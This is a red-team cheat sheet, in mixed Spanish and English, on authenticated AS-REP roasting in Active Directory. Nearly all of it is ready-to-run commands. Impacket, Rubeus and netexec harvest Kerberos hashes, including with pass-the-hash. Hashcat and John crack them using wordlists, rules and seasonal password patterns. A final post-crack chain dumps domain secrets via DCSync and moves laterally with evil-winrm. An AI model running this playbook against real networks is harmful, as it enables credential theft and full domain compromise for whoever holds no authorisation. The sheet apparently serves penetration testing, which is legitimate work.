---
aliases:
  - AS-REP Authenticated Roast
  - GetNPUsers Auth
  - Rubeus asreproast
  - hashcat 18200
tags:
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AS-REP Roasting]]"
---
# AS-REP Roasting - Roast With Auth & Crack

---

## Impacket GetNPUsers (Auth)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetNPUsers corp.local/u:p -dc-ip <DC> -request -format hashcat -outputfile h.txt` | Bulk con auth (LDAP enum + roast) | Standard post-foothold. |
| `impacket-GetNPUsers corp.local/u -hashes :<NT> -dc-ip <DC> -request -outputfile h.txt` | PtH auth | Sin password. |
| `impacket-GetNPUsers corp.local/u -k -no-pass -dc-ip <DC> -request -outputfile h.txt` | Kerberos (con TGT) | OPSEC. |
| `impacket-GetNPUsers corp.local/u:p -dc-ip <DC> -request -user <single>` | Single user | Targeted. |
| `impacket-GetNPUsers corp.local/u:p -dc-ip <DC> -request -outputfile h.txt -format john` | John format | Alt cracker. |
^asrep-auth-impacket

```bash
# Standard auth pipeline
impacket-GetNPUsers corp.local/auditor:'Pass!' -dc-ip <DC> \
  -request -format hashcat -outputfile asrep.hash

# Auto-discovers todos users con flag + roast bulk
```

---

## Rubeus asreproast (Windows)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt` | Bulk roast all (default) | Standard. |
| `Rubeus.exe asreproast /user:<single> /format:hashcat /outfile:single.txt` | Targeted | Stealth. |
| `Rubeus.exe asreproast /domain:partner.com /dc:<foreign-DC> /format:hashcat /outfile:cross.txt` | Cross-domain | Cross-trust. |
| `Rubeus.exe asreproast /nowrap /format:hashcat` | No line wrap output | Pipeline. |
| `Rubeus.exe asreproast /format:john /outfile:h.txt` | John format | Alt cracker. |
^asrep-auth-rubeus

```cmd
:: Standard targeted
Rubeus.exe asreproast /user:legacy_svc /format:hashcat /outfile:legacy.hash

:: Bulk
Rubeus.exe asreproast /format:hashcat /outfile:all.hash
```

---

## netexec asreproast

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --asreproast asrep.hash` | Bulk auth roast | Quick. |
| `nxc ldap <DC> -u u -H <NT> --asreproast asrep.hash` | PtH | Sin password. |
| `nxc ldap <DC> -u u -p p -k --asreproast asrep.hash` | Kerberos | OPSEC. |
^asrep-auth-nxc

---

## Hashcat Cracking

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -m 18200 asrep.hash rockyou.txt -O` | Standard wordlist | Default first. |
| `hashcat -m 18200 asrep.hash rockyou.txt -r best64.rule -O` | + rules | Common variations. |
| `hashcat -m 18200 asrep.hash rockyou.txt -r OneRuleToRuleThemAll.rule -O` | Comprehensive rules | Hard targets. |
| `hashcat -m 18200 asrep.hash -a 3 ?u?l?l?l?l?l?d?d?s -O` | Mask attack | Pattern targeted. |
| `hashcat -m 18200 asrep.hash -a 6 rockyou.txt ?d?d?d?d -O` | Hybrid wordlist + mask | Year suffix. |
| `hashcat -m 18200 asrep.hash --show` | Show cracked | Post-run. |
^asrep-auth-hashcat

**Hashcat mode `18200`** = AS-REP Kerberos 5 etype 23 (RC4-HMAC). Mode único — no AES variant separado (AS-REP roast usually RC4 default).

```bash
# Standard pipeline
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -O

# Si rockyou no pega → rules
hashcat -m 18200 asrep.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
```

---

## John the Ripper

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `john --format=krb5asrep --wordlist=rockyou.txt asrep.hash` | Standard | Alt. |
| `john --format=krb5asrep asrep.hash --rules=Best64 --wordlist=rockyou.txt` | + rules | Comprehensive. |
| `john --format=krb5asrep --show asrep.hash` | Show cracked | Post-run. |
^asrep-auth-john

---

## Wordlists Recomendadas

| **Wordlist** | **Path / Cuándo** |
|:---:|:---:|
| `rockyou.txt` | Default first attempt. |
| `crackstation-human-only.txt` | Comprehensive humans. |
| `cewl https://corp.com -d 2 -m 5 -w corp.txt` | Org-specific patterns. |
| `<Company>2026!`, `Welcome2026!`, `Spring2026!` patterns | Service account convention. |
| `seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt` | Top 1M | Coverage. |
^asrep-auth-wordlists

---

## Post-Crack Verification

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -m 18200 asrep.hash --show` | Show cracked | Post-run. |
| `nxc smb <target> -u <user> -p '<cracked>'` | Validate password | Confirm. |
| `nxc smb <target> -u <user> -p '<cracked>' --groups` | Effective groups | Privesc check. |
| `Rubeus.exe asktgt /user:<user> /password:<cracked> /domain:corp.local /ptt` | TGT auth | Standard use. |
^asrep-auth-verify

---

## Cracked Password Privesc Chain

```bash
# Pipeline post-crack
USER=legacy_svc
PWD='Spring2026!'

# Validate
nxc smb <DC> -u $USER -p $PWD

# Check effective priv
nxc smb <DC> -u $USER -p $PWD --groups

# Si DA → DCSync
impacket-secretsdump corp.local/$USER:$PWD@<DC> -just-dc

# Si lateral → WinRM
evil-winrm -i <target> -u $USER -p $PWD

# BloodHound mark owned
# UI: User node → Mark Owned
```

---

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `Token length exception` (hashcat) | Hash format wrong | Verify `$krb5asrep$23$user@DOM:...`. |
| `No hashes loaded` | Format issue | Check newlines / `$` escape. |
| Cracked but `STATUS_LOGON_FAILURE` post-validate | Pwd rotated post-roast | Re-roast post-rotation. |
| `KRB_AP_ERR_SKEW` post-asktgt | Clock skew | NTP sync. |
| Hash sin output (silent) | User no tiene flag set realmente | Verify con `Get-ADUser -Filter`. |
^asrep-auth-errors

---
